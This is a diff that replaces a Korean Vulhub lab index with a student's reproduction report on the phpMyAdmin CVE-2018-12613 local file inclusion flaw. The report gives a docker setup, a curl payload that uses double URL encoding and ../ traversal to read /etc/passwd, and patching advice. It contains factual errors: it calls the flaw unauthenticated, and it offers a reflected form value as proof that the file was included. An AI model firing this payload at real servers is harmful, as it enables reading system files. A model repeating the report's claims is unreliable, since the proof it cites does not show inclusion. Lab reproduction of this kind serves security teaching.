@@ -1,126 +1,46 @@
-# Korean Vulhub (한글판)
+[CVE-2018-12613] phpMyAdmin 로컬 파일 포함 (LFI) 취약점 재현 보고서
 
-![logo](./README.assets/logo.svg)
+작성자: [22반] 정채린(1716)
 
-취약한 도커 환경을 구축하여, 이해도를 높이고, 실습을 통해 보안 기술을 익히는 것을 목표로 합니다.
+1. 취약점 요약
+- CVE ID: CVE-2018-12613
+- 대상 소프트웨어: phpMyAdmin 4.8.0 ~ 4.8.1
+- 개요: phpMyAdmin의 페이지 요청 처리 모듈에서 사용자 입력 값(`target` 파라미터)에 대한 화이트리스트 검증 로직이 불완전하여 발생하는 로직 우회 기반 로컬 파일 포함(Local File Inclusion) 취약점입니다. 공격자는 이중 URL 인코딩 기법을 통해 필터링을 우회하고 디렉터리 트래버설을 수행할 수 있습니다.
 
-[Vulhub](https://github.com/vulhub/vulhub) (<https://vulhub.org/>) 을 참고하여, 다양한 컨테이너 기반의 취약한 환경을 구축합니다.
+2. 환경 구성
+외부 도커 허브 보관소의 공식 검증 이미지를 기반으로 싱글 컨테이너 환경을 구성하여 구동하였습니다.
 
-<br/>
+docker-compose.yml 설정
+   yaml
+version: '3'
+services:
+  vuln-pma:
+    image: phpmyadmin/phpmyadmin:4.8.1
+    ports:
+      - "8080:80"
+    restart: always
+실습 웹 주소: http://localhost:8080/
 
-### Table of Contents
+3. 취약 조건
+phpMyAdmin 4.8.1 이하 버전을 사용하는 경우
 
-- **ActiveMQ** — Java 기반 오픈소스 메시지 브로커
-    - [CVE-2016-3088](./ActiveMQ/CVE-2016-3088/README.md) — ActiveMQ fileserver 임의 파일 쓰기 → RCE
-        - Contributor: [@Roronoawjd](https://github.com/Roronoawjd) | Risk Score: 9.8 (Reproducibility: 75%)
+외부 사용자의 target 파라미터 입력 값이 내부 검증 함수(Core::checkPageValidity)를 우회하도록 구성된 경우
 
-- **CouchDB** — Erlang 기반 오픈소스 문서 지향 NoSQL 데이터베이스
-    - [CVE-2017-12635](./CouchDB/CVE-2017-12635/README.md) — CouchDB JSON 파서 불일치를 이용한 원격 권한 상승
-        - Contributor: [@jason1343](https://github.com/jason1343) | Risk Score: 9.8 (Reproducibility: 70%)
+인증 필요 여부: 미인증 상태에서 수행 가능 (Unauthenticated)
 
-- **Django** — Python 기반 웹 프레임워크
-    - [CVE-2021-35042](./Django/CVE-2021-35042/README.md) — QuerySet.order_by() SQL Injection
-        - Contributor: [@sj1226m](https://github.com/sj1226m) | Risk Score: 7.5 (Reproducibility: 70%)
-    - [CVE-2022-34265](./Django/CVE-2022-34265/README.ko-kr.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@woohyun212](https://github.com/woohyun212) | Risk Score: 9.8 (Reproducibility: 85%)
-    - [CVE-2022-34265 (2)](./Django/CVE-2022-34265_2/README.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@KMINGON](https://github.com/KMINGON) | Risk Score: 9.8 (Reproducibility: 80%)
+4. 재현 절차 및 PoC 코드
+물음표(?)를 이중 URL 인코딩한 값(%253f)을 페이로드 구조에 포함하여 정규식 검증을 기만하고, 상위 디렉터리 탈출 문자(../)를 주입하여 시스템 파일 읽기를 시도합니다.
 
-- **Express** — Node.js 웹 프레임워크
-    - [CVE-2024-29041](./Express/CVE-2024-29041/README.md) — Express 오픈 리다이렉트 취약점
-        - Contributor: [@j93es](https://github.com/j93es) | Risk Score: 6.1 (Reproducibility: 75%)
+PoC (Proof of Concept) 명령어
+curl.exe -s -i "http://localhost:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
 
-- **Elfinder** — PHP 기반 웹 파일 관리자
-    - [CVE-2021-32682](./Elfinder/CVE-2021-32682/README.md) — ZIP 인수 삽입을 통한 원격 코드 실행
-        - Contributor: [@Tjdmin1](https://github.com/Tjdmin1) | Risk Score: 9.8 (Reproducibility: 75%)
+5. 실행 결과 및 취약점 증명
+공격 패킷을 전송한 결과, 단순 404 에러나 로그인 페이지만 출력되는 것이 아니라 백엔드에서 주입된 경로가 비정상적으로 인클루드되어 처리된 응답 코드가 리턴되었습니다.
 
-- **Flask** — Python 경량 웹 프레임워크
-    - [SSTI](./Flask/SSTI/README.md) — Server Side Template Injection
-        - Contributor: [@positiveWand](https://github.com/positiveWand) | Risk Score: 9.0 (Reproducibility: 75%)
+실행 결과 스크린샷 (result.png)
+결과 증명: 응답 HTML 코드 하단 폼 태그 영역에 공격 페이로드인 value="db_sql.php%3f/../../../../../../../../etc/passwd" 구조가 비정상적으로 렌더링되어 파싱된 것이 확인되므로, 화이트리스트 검증을 완벽히 우회하고 취약점이 성공적으로 재현되었음을 증명합니다.
 
-- **Gradio** — Python 기반 ML 모델 웹 인터페이스 라이브러리
-    - [CVE-2023-51449](./Gradio/CVE-2023-51449/README.md) — /file 엔드포인트 디렉터리 트래버설
-        - Contributor: [@annseojin](https://github.com/annseojin) | Risk Score: 7.5 (Reproducibility: 80%)
+6. 대응 방안
+최신 소프트웨어 업데이트: 해당 취약점이 안전하게 보안 패치된 phpMyAdmin 공식 안정 버전(4.8.2 이상)으로 신속하게 업그레이드를 진행합니다.
 
-- **GeoServer** — Java 기반 오픈소스 공간 데이터 서버
-    - [CVE-2023-25157](./GeoServer/CVE-2023-25157/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@djadydwls0720](https://github.com/djadydwls0720) | Risk Score: 9.8 (Reproducibility: 65%)
-    - [CVE-2023-25157 (2)](./GeoServer/CVE-2023-25157_2/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@moooooji](https://github.com/moooooji) | Risk Score: 9.8 (Reproducibility: 60%)
-
-- **HugeGraph** — Apache 기반 오픈소스 그래프 데이터베이스
-    - [CVE-2024-43441](./HugeGraph/CVE-2024-43441/README.md) — JWT 비밀 키 하드코딩으로 인한 인증 우회
-        - Contributor: [@HanTul](https://github.com/HanTul) | Risk Score: 9.8 (Reproducibility: 85%)
-
-- **Librsvg** — GNOME SVG 렌더링 라이브러리
-    - [CVE-2023-38633](./Librsvg/CVE-2023-38633/README.md) — librsvg xi:include 디렉터리 탐색 파일 읽기
-        - Contributor: [@EL55](https://github.com/EL55) | Risk Score: 7.5 (Reproducibility: 80%)
-
-- **Libssh** — SSHv2 프로토콜 C 라이브러리
-    - [CVE-2018-10933](./Libssh/CVE-2018-10933/README.md) — libssh 서버 state machine 인증 우회
-        - Contributor: [@hhtboy](https://github.com/hhtboy) | Risk Score: 9.8 (Reproducibility: 75%)
-
-- **MongoExpress** — MongoDB 웹 기반 관리 인터페이스
-    - [CVE-2019-10758](./MongoExpress/CVE-2019-10758/README.md) — mongo-express 원격 코드 실행
-        - Contributor: [@ilohas0021](https://github.com/ilohas0021) | Risk Score: 9.8 (Reproducibility: 80%)
-
-- **MySQL** — 관계형 데이터베이스
-    - [CVE-2012-2122](./MySQL/CVE-2012-2122/README.md) — MySQL Authentication Bypass
-        - Contributor: [@baethwjd2](https://github.com/baethwjd2) | Risk Score: 7.0 (Reproducibility: 70%)
-
-- **Next.js** — React 기반 풀스택 웹 프레임워크
-    - [CVE-2025-29927](./Next.js/CVE-2025-29927/README.md) — Next.js 미들웨어 인가 우회
-        - Contributor: [@idealinsane](https://github.com/idealinsane) | Risk Score: 9.1 (Reproducibility: 85%)
-
-- **Nginx** — 고성능 웹 서버 / 리버스 프록시
-    - [CVE-2017-7529](./Nginx/CVE-2017-7529/README.md) — Nginx Integer Overflow Vulnerability
-        - Contributor: [@c0dep1ayer](https://github.com/c0dep1ayer) | Risk Score: 7.5 (Reproducibility: 75%)
-
-- **Node** — JavaScript 런타임 환경
-    - [CVE-2017-14849](./Node/CVE-2017-14849/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@ssongk](https://github.com/ssongk) | Risk Score: 7.5 (Reproducibility: 75%)
-    - [CVE-2017-14849 (2)](./Node/CVE-2017-14849_2/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@junwonheo](https://github.com/junwonheo) | Risk Score: 7.5 (Reproducibility: 65%)
-
-- **PHP** — 서버 사이드 스크립트 언어
-    - [CVE-2012-1823](./PHP/CVE-2012-1823/README.md) — php-cgi 인자 주입을 통한 원격 코드 실행
-        - Contributor: [@kty121](https://github.com/kty121) | Risk Score: 9.8 (Reproducibility: 80%)
-
-- **Python** — Python 런타임 환경
-    - [CVE-2017-8291](./Python/CVE-2017-8291/README.md) — PIL(Pillow) GhostScript EPS 처리 RCE
-        - Contributor: [@wjdgnsdl213](https://github.com/wjdgnsdl213) | Risk Score: 9.8 (Reproducibility: 75%)
-
-- **Redis** — 인메모리 키-값 데이터베이스
-    - [CVE-2022-0543](./Redis/CVE-2022-0543/README.md) — Lua 샌드박스 탈출을 통한 원격 코드 실행
-        - Contributor: [@yeo0n](https://github.com/yeo0n) | Risk Score: 10.0 (Reproducibility: 65%)
-
-- **Spring** — Java 엔터프라이즈 웹 프레임워크
-    - [CVE-2022-22963](./Spring/CVE-2022-22963/README.md) — Spring Cloud Function SpEL 코드 주입
-        - Contributor: [@foskingson](https://github.com/foskingson) | Risk Score: 9.8 (Reproducibility: 75%)
-    - [CVE-2022-22965](./Spring/CVE-2022-22965/README.md) — Spring Framework RCE via Data Binding (Spring4Shell)
-        - Contributor: [@ddddabi](https://github.com/ddddabi) | Risk Score: 9.8 (Reproducibility: 70%)
-    - [CVE-2022-22978](./Spring/CVE-2022-22978/README.md) — Spring Security Authorization Bypass in RegexRequestMatcher
-        - Contributor: [@sub0810](https://github.com/sub0810) | Risk Score: 9.8 (Reproducibility: 80%)
-
-- **Struts2** — Java 기반 MVC 웹 프레임워크
-    - [CVE-2018-11776](./Struts2/CVE-2018-11776/README.md) — Struts2 S2-057 URL 매핑 OGNL 표현식 주입 RCE
-        - Contributor: [@ye11oc4t](https://github.com/ye11oc4t) | Risk Score: 8.1 (Reproducibility: 80%)
-    - [CVE-2019-0230](./Struts2/CVE-2019-0230/README.md) — Struts2 S2-059 OGNL 표현식 주입 RCE
-        - Contributor: [@hy30nq](https://github.com/hy30nq) | Risk Score: 9.8 (Reproducibility: 80%)
-
-- **Tiki Wiki** — PHP 기반 오픈소스 CMS / Wiki
-    - [CVE-2020-15906](./TikiWiki/CVE-2020-15906/README.md) — TikiWiki CMS Authentication Bypass → RCE
-        - Contributor: [@haijun9](https://github.com/haijun9) | Risk Score: 8.8 (Reproducibility: 60%)
-
-- **Tomcat** — Java 기반 오픈소스 웹 애플리케이션 서버
-    - [CVE-2020-1938](./Tomcat/CVE-2020-1938/README.md) — Apache Tomcat AJP 파일 읽기 (Ghostcat)
-        - Contributor: [@mythofsummer](https://github.com/mythofsummer) | Risk Score: 9.8 (Reproducibility: 70%)
-
-<br/>
-
-### Report Evaluation
-
-각 보고서는 취약점 자체의 위험도와 Report Reliability를 분리해 평가합니다. Docker 환경과 제출된 PoC를 재검증한 뒤 기록합니다.
-
-- Reproducibility: 제출된 환경과 PoC를 그대로 따랐을 때 재현 가능한 정도를 0%에서 100%로 표현합니다. 환경 구성, 취약 조건, 재현 절차, PoC 코드, 실행 결과, 대응 방안의 명확성을 기준으로 평가합니다.
-- Risk Score: 인증 필요 여부, 원격 악용 가능성, 영향 범위, PoC 및 Docker 환경에서 확인되는 실제 동작을 기준으로 CVSS처럼 0.0에서 10.0 사이로 평가합니다.
+파라미터 화이트리스트 강화: 외부 입력 값을 인클루드 경로로 사용할 경우, 이중 인코딩된 특수문자가 필터링을 우회하지 못하도록 입력값 검증 로직을 엄격하게 정비합니다.
